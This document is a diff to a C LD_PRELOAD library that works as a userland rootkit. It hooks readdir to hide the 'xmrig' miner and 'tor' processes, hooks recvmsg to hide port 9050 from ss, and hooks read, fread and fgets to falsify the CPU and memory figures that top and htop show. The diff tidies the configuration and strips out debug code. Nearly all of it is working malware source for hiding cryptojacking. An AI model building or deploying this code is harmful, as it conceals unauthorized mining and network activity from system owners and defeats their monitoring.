@@ -18,38 +18,62 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 
+/**
+ * ======================================================================
+ *                          CONFIGURATION
+ * ======================================================================
+ */
+
 /*
  * Every process with this name will be excluded
  */
-static const char *process_to_filter = "xmrig";
+static const char *process_to_filter_1 = "xmrig";
+static const char *process_to_filter_2 = "tor";
 
 /**
  * Port to hide
+ *
+ * - 9050: Tor
  */
-// static const int port_to_hide = 55271;
-static const int port_to_hide = 45552;
+static const int port_to_hide = 9050;
 
-static int (*old_openat)(int dirfd, const char *pathname, int flags) = NULL;
-static ssize_t (*old_recvmsg)(int sockfd, struct msghdr *msg, int flags) = NULL;
-FILE *(*old_fopen)(const char *path, const char *mode) = NULL;
-FILE *(*old_fopen64)(const char *path, const char *mode) = NULL;
-size_t (*old_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
-size_t (*old_fread64)(void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
-static char *(*old_fgets)(char *s, int size, FILE *stream) = NULL;
-
-// Read system call
-static ssize_t (*old_read)(int fd, void *buf, size_t count) = NULL;
-
-/**************
- * HELPERS
- * ************/
+/**
+ * ======================================================================
+ *                          HELPER FUNCTIONS
+ * ======================================================================
+ */
 
 /*
  * Get a path name given a FILE* handle
  */
-static int get_path_file(FILE *file, char *buf, size_t size)
+static int get_path_file(FILE *file, char *path, size_t size)
 {
     int fd = fileno(file);
+    if (fd == -1)
+    {
+        return 0;
+    }
+
+    char tmp[64];
+    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
+    ssize_t ret = readlink(tmp, path, size);
+    if (ret == -1)
+    {
+        return 0;
+    }
+
+    path[ret] = 0;
+    return 1;
+}
+
+/*
+ * Get a directory name given a DIR* handle
+ * From:
+ * - https://github.com/gianlucaborello/libprocesshider
+ */
+static int get_dir_name(DIR *dirp, char *buf, size_t size)
+{
+    int fd = dirfd(dirp);
     if (fd == -1)
     {
         return 0;
@@ -67,11 +91,54 @@ static int get_path_file(FILE *file, char *buf, size_t size)
     return 1;
 }
 
-/**************
- * PRELOAD
- ***************/
+/*
+ * Get a process name given its pid
+ *
+ * From:
+ * - https://github.com/gianlucaborello/libprocesshider
+ */
+static int get_process_name(char *pid, char *buf)
+{
+    if (strspn(pid, "0123456789") != strlen(pid))
+    {
+        return 0;
+    }
 
-// Read system call
+    char tmp[256];
+    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+
+    FILE *f = fopen(tmp, "r");
+    if (f == NULL)
+    {
+        return 0;
+    }
+
+    if (fgets(tmp, sizeof(tmp), f) == NULL)
+    {
+        fclose(f);
+        return 0;
+    }
+
+    fclose(f);
+
+    int unused;
+    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    return 1;
+}
+
+/**
+ * ======================================================================
+ *                          PRELOAD
+ * ======================================================================
+ */
+size_t (*old_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
+static char *(*old_fgets)(char *s, int size, FILE *stream) = NULL;
+static ssize_t (*old_recvmsg)(int sockfd, struct msghdr *msg, int flags) = NULL;
+static ssize_t (*old_read)(int fd, void *buf, size_t count) = NULL;
+
+/**
+ * Used by top command for cpu usage
+ */
 ssize_t read(int fd, void *buf, size_t count)
 {
     if (old_read == NULL)
@@ -80,8 +147,6 @@ ssize_t read(int fd, void *buf, size_t count)
     }
 
     ssize_t ret = old_read(fd, buf, count);
-
-    // printf("read called with fd %d\n", fd);
 
     char tmp[64];
     snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
@@ -96,21 +161,6 @@ ssize_t read(int fd, void *buf, size_t count)
 
     // IMPORTANT: readlink does not add the null character
     path[len] = 0;
-
-    // printf("fread() called, fd: %d, path: %s \n", fd, path);
-
-    // printf("path: %s, count: %d, ret: %d\n", path, count, ret);
-
-    // Compare path /proc/stat for cpu usage
-    // printf("path: %s\n", path);
-
-    if (strcmp(path, "/proc/stat") == 0)
-    {
-        // Change first line of /proc/stat
-        char *line = strstr(buf, "cpu ");
-
-        // prinf("proc::stat -> line: %s\n", line);
-    }
 
     // Compare path /proc/meminfo
     if (strcmp(path, "/proc/meminfo") == 0)
@@ -128,10 +178,7 @@ ssize_t read(int fd, void *buf, size_t count)
 
         while (start != NULL)
         {
-            // printf("[debug] start: %s\n", start);
-
             end = strchr(start, '\n');
-            // printf("[debug] end: %s\n", end);
             if (end != NULL)
             {
                 *end = '\0';
@@ -152,11 +199,7 @@ ssize_t read(int fd, void *buf, size_t count)
                 sprintf(line, "%s\n", start);
             }
 
-            // String copy and add newline
-            // printf("[debug] line: %s\n", line);
-
             // Copy line to new buffer
-            // strncat(line, new_buf, sizeof(new_buf) - strlen(new_buf) - 1);
             strcat(new_buf, line);
 
             start = (end != NULL) ? end + 1 : NULL;
@@ -171,11 +214,12 @@ ssize_t read(int fd, void *buf, size_t count)
     return ret;
 }
 
+/**
+ * Used by ss command
+ *
+ */
 ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags)
 {
-    // printf("recvmsg() called\n");
-
-    // Debug messages
     if (old_recvmsg == NULL)
     {
         old_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
@@ -216,71 +260,6 @@ ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags)
     // Copy back to iov
     memcpy(iov->iov_base, buffer, buffer_size);
     free(buffer);
-
-    return ret;
-}
-
-int openat(int dirfd, const char *pathname, int flags)
-{
-    // printf("openat() called\n");
-
-    // Debug messages
-    if (old_openat == NULL)
-    {
-        old_openat = dlsym(RTLD_NEXT, "openat");
-    }
-
-    return old_openat(dirfd, pathname, flags);
-}
-
-FILE *fopen(const char *path, const char *mode)
-{
-    if (old_fopen == NULL)
-    {
-        old_fopen = dlsym(RTLD_NEXT, "fopen");
-    }
-
-    FILE *ret = old_fopen(path, mode);
-
-    const char *mem = "/proc/meminfo";
-    if (strcmp(path, mem) == 0)
-    {
-        return ret;
-        // printf("fopen() called on /proc/meminfo\n");
-        // return NULL;
-    }
-
-    // printf("fopen() called on %s\n", path);
-    return ret;
-}
-
-FILE *fopen64(const char *path, const char *mode)
-{
-    if (old_fopen64 == NULL)
-    {
-        old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
-    }
-
-    FILE *ret = old_fopen64(path, mode);
-
-    // Files to exclude from hiding
-    const char *tcp = "/proc/net/tcp";
-    const char *tcp6 = "/proc/net/tcp6";
-    const char *udp = "/proc/net/udp";
-    const char *udp6 = "/proc/net/udp6";
-    const char *mem = "/proc/meminfo";
-
-    // if (strcmp(path, tcp) == 0 || strcmp(path, tcp6) == 0 || strcmp(path, udp) == 0 || strcmp(path, udp6) == 0)
-    // {
-    //     return NULL;
-    // }
-    if (strcmp(path, mem) == 0)
-    {
-        // printf("fopen64() called on /proc/meminfo\n");
-        return ret;
-        // return NULL;
-    }
-    // printf("fopen64() called on %s\n", path);
 
     return ret;
 }
@@ -341,8 +320,6 @@ size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
             // if (strcmp(line, "cpu ") == 0)
             if (strncmp(line, "cpu ", 4) == 0)
             {
-                // printf("cpu line found\n");
-
                 // Scanf the values
                 int user, nice, system, idle, iowait, irq, softirq, steal, guest, guest_nice;
                 int result = sscanf(ptr, "cpu  %d %d %d %d %d %d %d %d %d %d", &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal, &guest, &guest_nice);
@@ -389,42 +366,12 @@ size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
         free(new_buf);
     }
 
-    // printf("fread() called, fd: %d, path: %s \n", fd, path);
-
     return ret;
 }
 
-size_t fread64(void *ptr, size_t size, size_t nmemb, FILE *stream)
-{
-    if (old_fread64 == NULL)
-    {
-        old_fread64 = dlsym(RTLD_NEXT, "fread64");
-    }
-
-    // Debug information
-    size_t ret = old_fread64(ptr, size, nmemb, stream);
-
-    int fd = fileno(stream);
-    if (fd == -1)
-    {
-        return 0;
-    }
-
-    char tmp[64];
-    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
-
-    char path[PATH_MAX];
-    ssize_t len = readlink(tmp, path, sizeof(path) - 1);
-
-    if (len == -1)
-    {
-        return 0;
-    }
-
-    printf("fread64() called, fd: %d, path: %s \n", fd, path);
-    return ret;
-}
-
+/**
+ * Used by htop command for cpu usage
+ */
 char *fgets(char *s, int size, FILE *stream)
 {
     if (old_fgets == NULL)
@@ -456,9 +403,6 @@ char *fgets(char *s, int size, FILE *stream)
     {
         path[len] = '\0';
     }
-
-    // printf("fgets() called -> path: %s\n", path);
-    // printf("---> %s\n", s);
 
     // Check we are reading the /proc/stat file
     // The same as before, we check the first part of the path
@@ -492,7 +436,6 @@ char *fgets(char *s, int size, FILE *stream)
         int cpu_num;
         if (sscanf(s, "cpu%d", &cpu_num) == 1)
         {
-            // printf("DEBUG:::: CPU number: %d\n", cpu_num);
             int user, nice, system, idle, iowait, irq, softirq, steal, guest, guest_nice;
 
             sscanf(s, "cpu%d %d %d %d %d %d %d %d %d %d", &cpu_num, &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal, &guest, &guest_nice);
@@ -513,97 +456,45 @@ char *fgets(char *s, int size, FILE *stream)
     }
 }
 
-// From:
-// - https://github.com/gianlucaborello/libprocesshider
-/*
- * Get a directory name given a DIR* handle
+/**
+ * From:
+ * - https://github.com/gianlucaborello/libprocesshider
  */
-static int get_dir_name(DIR *dirp, char *buf, size_t size)
-{
-    int fd = dirfd(dirp);
-    if (fd == -1)
-    {
-        return 0;
-    }
-
-    char tmp[64];
-    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
-    ssize_t ret = readlink(tmp, buf, size);
-    if (ret == -1)
-    {
-        return 0;
-    }
-
-    buf[ret] = 0;
-    return 1;
-}
-
-/*
- * Get a process name given its pid
- */
-static int get_process_name(char *pid, char *buf)
-{
-    if (strspn(pid, "0123456789") != strlen(pid))
-    {
-        return 0;
-    }
-
-    char tmp[256];
-    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
-
-    FILE *f = fopen(tmp, "r");
-    if (f == NULL)
-    {
-        return 0;
-    }
-
-    if (fgets(tmp, sizeof(tmp), f) == NULL)
-    {
-        fclose(f);
-        return 0;
-    }
-
-    fclose(f);
-
-    int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
-    return 1;
-}
-
-#define DECLARE_READDIR(dirent, readdir)                              \
-    static struct dirent *(*original_##readdir)(DIR *) = NULL;        \
-                                                                      \
-    struct dirent *readdir(DIR *dirp)                                 \
-    {                                                                 \
-        if (original_##readdir == NULL)                               \
-        {                                                             \
-            original_##readdir = dlsym(RTLD_NEXT, #readdir);          \
-            if (original_##readdir == NULL)                           \
-            {                                                         \
-                fprintf(stderr, "Error in dlsym: %s\n", dlerror());   \
-            }                                                         \
-        }                                                             \
-                                                                      \
-        struct dirent *dir;                                           \
-                                                                      \
-        while (1)                                                     \
-        {                                                             \
-            dir = original_##readdir(dirp);                           \
-            if (dir)                                                  \
-            {                                                         \
-                char dir_name[256];                                   \
-                char process_name[256];                               \
-                if (get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
-                    strcmp(dir_name, "/proc") == 0 &&                 \
-                    get_process_name(dir->d_name, process_name) &&    \
-                    strcmp(process_name, process_to_filter) == 0)     \
-                {                                                     \
-                    continue;                                         \
-                }                                                     \
-            }                                                         \
-            break;                                                    \
-        }                                                             \
-        return dir;                                                   \
+#define DECLARE_READDIR(dirent, readdir)                               \
+    static struct dirent *(*original_##readdir)(DIR *) = NULL;         \
+                                                                       \
+    struct dirent *readdir(DIR *dirp)                                  \
+    {                                                                  \
+        if (original_##readdir == NULL)                                \
+        {                                                              \
+            original_##readdir = dlsym(RTLD_NEXT, #readdir);           \
+            if (original_##readdir == NULL)                            \
+            {                                                          \
+                fprintf(stderr, "Error in dlsym: %s\n", dlerror());    \
+            }                                                          \
+        }                                                              \
+                                                                       \
+        struct dirent *dir;                                            \
+                                                                       \
+        while (1)                                                      \
+        {                                                              \
+            dir = original_##readdir(dirp);                            \
+            if (dir)                                                   \
+            {                                                          \
+                char dir_name[256];                                    \
+                char process_name[256];                                \
+                if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&  \
+                    strcmp(dir_name, "/proc") == 0 &&                  \
+                    get_process_name(dir->d_name, process_name) &&     \
+                    (strcmp(process_name, process_to_filter_1) == 0 || \
+                     strcmp(process_name, process_to_filter_2) == 0))  \
+                {                                                      \
+                    continue;                                          \
+                }                                                      \
+            }                                                          \
+            break;                                                     \
+        }                                                              \
+        return dir;                                                    \
     }
 
 DECLARE_READDIR(dirent64, readdir64);
